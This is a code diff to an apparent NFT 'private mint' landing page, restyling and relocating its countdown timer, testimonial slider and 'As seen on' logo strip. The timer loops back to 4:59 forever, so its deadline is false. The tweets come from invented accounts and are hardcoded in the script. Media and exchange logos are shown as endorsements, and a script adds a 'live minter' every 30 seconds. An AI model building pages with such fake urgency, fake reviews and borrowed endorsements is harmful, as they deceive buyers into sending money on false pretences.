@@ -197,27 +197,6 @@
       color: var(--gold);
       text-shadow: 0 2px 12px rgba(255,224,102,0.12);
     }
-    .mint-timer {
-      width: 100%;
-      text-align: center;
-      font-family: 'Unbounded', Arial, sans-serif;
-      font-size: 1.15rem;
-      font-weight: 700;
-      letter-spacing: 1px;
-      margin-bottom: 10px;
-      color: #00eaff;
-      background: linear-gradient(90deg, #009efd 0%, #2af598 100%);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      text-fill-color: transparent;
-      text-shadow: 0 2px 12px #009efd33;
-      border-radius: 12px;
-      box-shadow: 0 2px 12px 0 #009efd22;
-      padding: 6px 0 2px 0;
-      user-select: none;
-      transition: color 0.2s;
-    }
     .mint-status {
       font-size: 1.1rem;
       font-weight: 600;
@@ -508,96 +487,87 @@
     @media (max-width: 700px) {
       .mint-leaf-bg-item { opacity: 0.06 !important; width: 48px !important; }
     }
-    /* As seen on */
-    .as-seen-on {
+    .mint-timer {
       display: flex;
       align-items: center;
-      gap: 18px;
-      margin: 10px 0 18px 0;
       justify-content: center;
-      animation: fadeInUp 1.2s cubic-bezier(.23,1.01,.32,1) 0.15s both;
-    }
-    .as-seen-on-label {
-      color: var(--text-secondary);
-      font-family: 'Inter', Arial, sans-serif;
-      font-size: 1.05rem;
-      font-weight: 600;
+      gap: 10px;
+      font-family: 'Unbounded', Arial, sans-serif;
+      font-size: 1.15rem;
+      font-weight: 700;
+      background: linear-gradient(90deg, #009efd 0%, #2af598 100%);
+      color: #fff;
+      border-radius: 14px;
+      box-shadow: 0 2px 16px 0 rgba(42,245,152,0.10);
+      padding: 10px 22px;
+      margin-bottom: 18px;
       letter-spacing: 1px;
-      margin-right: 8px;
+      text-shadow: 0 2px 12px rgba(42,245,152,0.12);
+      border: 1.5px solid rgba(42,245,152,0.13);
     }
-    .as-seen-on-logos {
-      display: flex;
-      gap: 14px;
+    .mint-timer .timer-icon {
+      font-size: 1.2em;
+      margin-right: 2px;
     }
-    .as-seen-logo {
-      height: 28px;
-      width: auto;
-      filter: drop-shadow(0 2px 8px #2af59844) brightness(1.15);
-      opacity: 0;
-      animation: logoFadeIn 0.7s forwards;
+    .mint-timer .timer-label {
+      color: #ffe066;
+      margin-right: 6px;
     }
-    .as-seen-logo:nth-child(1) { animation-delay: 0.2s; }
-    .as-seen-logo:nth-child(2) { animation-delay: 0.35s; }
-    .as-seen-logo:nth-child(3) { animation-delay: 0.5s; }
-    .as-seen-logo:nth-child(4) { animation-delay: 0.65s; }
-    @keyframes logoFadeIn {
-      from { opacity: 0; transform: translateY(12px) scale(0.95); }
-      to { opacity: 1; transform: none; }
+    .mint-timer .timer-value {
+      font-family: 'Unbounded', Arial, sans-serif;
+      font-size: 1.15em;
+      background: linear-gradient(90deg, #2af598 0%, #009efd 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      text-fill-color: transparent;
+      font-weight: 900;
     }
-    /* Twitter отзывы */
-    .twitter-reviews-wrap {
-      margin: 32px auto 0 auto;
+    .twitter-slider-wrap {
+      margin: 38px auto 0 auto;
       max-width: 480px;
       width: 100%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
       background: var(--bg-card);
       border-radius: 18px;
       box-shadow: var(--shadow);
       border: 1.5px solid var(--border);
-      padding: 18px 8px 12px 8px;
-      animation: fadeInUp 1.2s cubic-bezier(.23,1.01,.32,1) 0.25s both;
+      padding: 18px 8px 18px 8px;
+      animation: fadeInUp 1.2s cubic-bezier(.23,1.01,.32,1) 0.4s both;
       position: relative;
       overflow: hidden;
     }
-    .twitter-reviews-slider {
+    .twitter-slider {
       display: flex;
       flex-direction: row;
-      width: 100%;
+      align-items: stretch;
       transition: transform 0.7s cubic-bezier(.23,1.01,.32,1);
       will-change: transform;
     }
-    .twitter-review-slide {
+    .twitter-slide {
       min-width: 100%;
       max-width: 100%;
       display: flex;
-      align-items: flex-start;
-      gap: 16px;
-      padding: 0 8px;
+      align-items: center;
+      gap: 18px;
+      padding: 0 12px;
       opacity: 0;
-      transition: opacity 0.5s;
+      transition: opacity 0.7s cubic-bezier(.23,1.01,.32,1);
       position: absolute;
-      left: 0; top: 0;
-      width: 100%;
+      left: 0; top: 0; right: 0; bottom: 0;
       height: 100%;
-      z-index: 1;
       background: none;
-      pointer-events: none;
     }
-    .twitter-review-slide.active {
+    .twitter-slide.active {
       opacity: 1;
       position: relative;
-      pointer-events: auto;
-      z-index: 2;
     }
     .twitter-avatar {
-      width: 44px;
-      height: 44px;
+      width: 48px;
+      height: 48px;
       border-radius: 50%;
       background: linear-gradient(135deg, #23234a 60%, #2af598 100%);
       border: 2.5px solid #fff;
-      box-shadow: 0 2px 8px 0 #2af59822;
+      box-shadow: 0 2px 8px 0 rgba(42,245,152,0.12);
       display: flex;
       align-items: center;
       justify-content: center;
@@ -610,38 +580,72 @@
     }
     .twitter-user {
       font-family: 'Unbounded', Arial, sans-serif;
-      font-size: 1.08rem;
       font-weight: 700;
-      color: #00eaff;
-      letter-spacing: 0.5px;
+      font-size: 1.1rem;
+      color: #1da1f2;
       margin-bottom: 2px;
-      display: flex;
-      align-items: center;
-      gap: 6px;
     }
     .twitter-handle {
       font-family: 'Inter', Arial, sans-serif;
       font-size: 0.98rem;
-      color: var(--text-secondary);
-      font-weight: 400;
+      color: #b0b0c3;
       margin-left: 4px;
     }
     .twitter-text {
       font-family: 'Inter', Arial, sans-serif;
       font-size: 1.08rem;
-      color: var(--text-main);
-      background: linear-gradient(90deg, #009efd11 0%, #2af59811 100%);
-      border-radius: 10px;
-      padding: 8px 14px;
+      color: #f7faff;
+      background: linear-gradient(90deg, #009efd 0%, #2af598 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      text-fill-color: transparent;
+      font-weight: 600;
       margin-top: 2px;
-      box-shadow: 0 2px 8px 0 #009efd11;
-      line-height: 1.5;
-      word-break: break-word;
+      text-shadow: 0 2px 12px rgba(42,245,152,0.10);
+    }
+    .as-seen-on {
+      display: flex;
+      align-items: center;
+      gap: 18px;
+      margin: 0 auto 18px auto;
+      justify-content: center;
+      animation: fadeIn 1.2s cubic-bezier(.23,1.01,.32,1) 0.2s both;
+    }
+    .seen-label {
+      font-family: 'Inter', Arial, sans-serif;
+      font-size: 1.05rem;
+      color: #b0b0c3;
+      font-weight: 600;
+      margin-right: 8px;
+      letter-spacing: 1px;
+    }
+    .seen-logos {
+      display: flex;
+      gap: 14px;
+      align-items: center;
+    }
+    .seen-logo {
+      height: 28px;
+      width: auto;
+      filter: drop-shadow(0 2px 8px #2af59833) brightness(1.15);
+      opacity: 0;
+      animation: seenLogoFadeIn 0.8s forwards;
+    }
+    .seen-logo:nth-child(1) { animation-delay: 0.2s; }
+    .seen-logo:nth-child(2) { animation-delay: 0.4s; }
+    .seen-logo:nth-child(3) { animation-delay: 0.6s; }
+    .seen-logo:nth-child(4) { animation-delay: 0.8s; }
+    @keyframes seenLogoFadeIn {
+      from { opacity: 0; transform: translateY(12px) scale(0.95); }
+      to { opacity: 1; transform: none; }
     }
     @media (max-width: 700px) {
-      .as-seen-logo { height: 20px; }
+      .mint-timer { font-size: 0.98rem; padding: 7px 8px; }
       .twitter-avatar { width: 32px; height: 32px; font-size: 1.1rem; }
-      .twitter-reviews-wrap { padding: 10px 2px 6px 2px; }
+      .twitter-slider-wrap { padding: 8px 2px 8px 2px; }
+      .as-seen-on { gap: 8px; }
+      .seen-logo { height: 18px; }
     }
   </style>
 </head>
@@ -689,16 +693,6 @@
         </div>
         <span class="logo-title">EXCLUSIVE MINT</span>
       </div>
-      <!-- As seen on block -->
-      <div class="as-seen-on">
-        <span class="as-seen-on-label">As seen on:</span>
-        <div class="as-seen-on-logos">
-          <img src="https://cryptologos.cc/logos/coingecko-coingecko-logo.svg?v=026" alt="CoinGecko" class="as-seen-logo"/>
-          <img src="https://cryptologos.cc/logos/cointelegraph-cointelegraph-logo.svg?v=026" alt="CoinTelegraph" class="as-seen-logo"/>
-          <img src="https://cryptologos.cc/logos/zksync-zksync-logo.svg?v=026" alt="zkSync" class="as-seen-logo"/>
-          <img src="https://cryptologos.cc/logos/decrypt-decrypt-logo.svg?v=026" alt="Decrypt" class="as-seen-logo"/>
-        </div>
-      </div>
       <span class="exclusive-badge">PRIVATE MINT</span>
       <div class="stats-bar">
         <div class="stat-card">
@@ -721,11 +715,14 @@
   <div class="mint-section-wrap">
     <div class="mint-section">
       <div class="mint-counter" id="mintCounter">927 / 1000 NFTs Minted</div>
-      <!-- Mint ends in timer -->
-      <div class="mint-timer" id="mintTimer">⏳ Mint ends in: 00:04:59</div>
       <div class="mint-status" id="mintStatus">
         <span class="status-dot" id="statusDot"></span>
         <span id="statusText">LIVE</span>
+      </div>
+      <div class="mint-timer" id="mintTimer">
+        <span class="timer-icon">⏳</span>
+        <span class="timer-label">Mint ends in:</span>
+        <span class="timer-value" id="timerValue">00:04:59</span>
       </div>
       <button class="mint-btn" id="mintBtn" onclick="mint()">Mint Now</button>
       <div class="loader" id="loader"></div>
@@ -742,10 +739,10 @@
     </div>
   </div>
 
-  <!-- Twitter отзывы -->
-  <div class="twitter-reviews-wrap">
-    <div class="twitter-reviews-slider" id="twitterReviewsSlider">
-      <!-- Slides will be injected here -->
+  <!-- Слайдер с отзывами Twitter -->
+  <div class="twitter-slider-wrap">
+    <div class="twitter-slider" id="twitterSlider">
+      <!-- Слайды будут добавлены скриптом -->
     </div>
   </div>
 
@@ -756,6 +753,17 @@
       <div class="log-list" id="logList">
         <!-- log items -->
       </div>
+    </div>
+  </div>
+
+  <!-- As seen on: -->
+  <div class="as-seen-on">
+    <span class="seen-label">As seen on:</span>
+    <div class="seen-logos">
+      <img src="https://cryptologos.cc/logos/coingecko-coingecko-logo.svg?v=026" alt="CoinGecko" class="seen-logo" />
+      <img src="https://cryptologos.cc/logos/cointelegraph-cointelegraph-logo.svg?v=026" alt="CoinTelegraph" class="seen-logo" />
+      <img src="https://cryptologos.cc/logos/zksync-zksync-logo.svg?v=026" alt="zkSync" class="seen-logo" />
+      <img src="https://cryptologos.cc/logos/decrypt-decrypt-logo.svg?v=026" alt="Decrypt" class="seen-logo" />
     </div>
   </div>
 
@@ -1011,83 +1019,83 @@
       updateMintersList();
       updateLogList();
     }
-    // --- Mint ends in timer ---
-    let timerSeconds = 299; // 4:59
+    // 1. Таймер окончания минта
+    let timerDuration = 299; // 4:59 в секундах
+    let timerInterval;
     function updateMintTimer() {
-      const el = document.getElementById('mintTimer');
-      if (!el) return;
-      let min = Math.floor(timerSeconds / 60);
-      let sec = timerSeconds % 60;
-      el.innerText = `⏳ Mint ends in: 00:${min.toString().padStart(2,'0')}:${sec.toString().padStart(2,'0')}`;
+      let minutes = Math.floor(timerDuration / 60);
+      let seconds = timerDuration % 60;
+      document.getElementById('timerValue').innerText = `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
     }
     function startMintTimer() {
-      timerSeconds = 299;
+      timerDuration = 299;
       updateMintTimer();
-      setInterval(() => {
-        timerSeconds--;
-        if (timerSeconds < 0) timerSeconds = 299;
+      if (timerInterval) clearInterval(timerInterval);
+      timerInterval = setInterval(() => {
+        timerDuration--;
+        if (timerDuration < 0) timerDuration = 299;
         updateMintTimer();
       }, 1000);
     }
-    // --- Twitter отзывы ---
+    // 2. Twitter-слайдер с отзывами
     const twitterReviews = [
       {
         avatar: '🦄',
         name: 'CryptoUnicorn',
         handle: '@unicorn_eth',
-        text: 'Just minted 3, can't wait to reveal 🔥'
+        text: "Just minted 3, can't wait to reveal 🔥"
       },
       {
-        avatar: '🐧',
-        name: 'PenguMint',
-        handle: '@pengu_mint',
+        avatar: '🐸',
+        name: 'Frogger',
+        handle: '@froggerNFT',
         text: 'Best drop this year. Calling it now. 💎'
       },
       {
         avatar: '🚀',
-        name: 'MoonRider',
-        handle: '@moonrider',
+        name: 'Moonshotter',
+        handle: '@moonshotter',
         text: 'LFG! This is about to explode 🚀'
       },
       {
         avatar: '🦊',
-        name: 'Foxie',
-        handle: '@foxie_nft',
-        text: 'Minted and ready for the moon!'
+        name: 'MetaFox',
+        handle: '@metafox',
+        text: 'Minted and ready for the reveal!'
       },
       {
         avatar: '🐼',
         name: 'PandaHodl',
         handle: '@panda_hodl',
-        text: 'This community is wild. Love it!'
+        text: 'This art is next level. Team delivered!'
       }
     ];
-    let twitterReviewIndex = 0;
-    function renderTwitterReviews() {
-      const slider = document.getElementById('twitterReviewsSlider');
-      if (!slider) return;
+    let twitterSlideIndex = 0;
+    function renderTwitterSlider() {
+      const slider = document.getElementById('twitterSlider');
       slider.innerHTML = '';
-      twitterReviews.forEach((review, idx) => {
+      twitterReviews.forEach((review, i) => {
         const slide = document.createElement('div');
-        slide.className = 'twitter-review-slide' + (idx === twitterReviewIndex ? ' active' : '');
+        slide.className = 'twitter-slide' + (i === twitterSlideIndex ? ' active' : '');
         slide.innerHTML = `
           <div class="twitter-avatar">${review.avatar}</div>
           <div>
-            <div class="twitter-user">${review.name} <span class="twitter-handle">${review.handle}</span></div>
+            <div class="twitter-user">${review.name}<span class="twitter-handle">${review.handle}</span></div>
             <div class="twitter-text">${review.text}</div>
           </div>
         `;
         slider.appendChild(slide);
       });
     }
-    function startTwitterSlider() {
-      renderTwitterReviews();
-      setInterval(() => {
-        twitterReviewIndex = (twitterReviewIndex + 1) % twitterReviews.length;
-        renderTwitterReviews();
-      }, 4000);
+    function nextTwitterSlide() {
+      twitterSlideIndex = (twitterSlideIndex + 1) % twitterReviews.length;
+      renderTwitterSlider();
     }
-    // --- Плавная загрузка ---
+    function startTwitterSlider() {
+      renderTwitterSlider();
+      setInterval(nextTwitterSlide, 4000);
+    }
+    // Плавная загрузка
     window.onload = () => {
       document.body.style.opacity = 0;
       setTimeout(() => {
@@ -1102,9 +1110,7 @@
       // Контракт инициализируется только при необходимости
       // Запускаем live-минтинг раз в 30 секунд
       setInterval(addLiveMinter, 30000);
-      // Запуск таймера минта
       startMintTimer();
-      // Запуск слайдера отзывов
       startTwitterSlider();
     };
   </script>
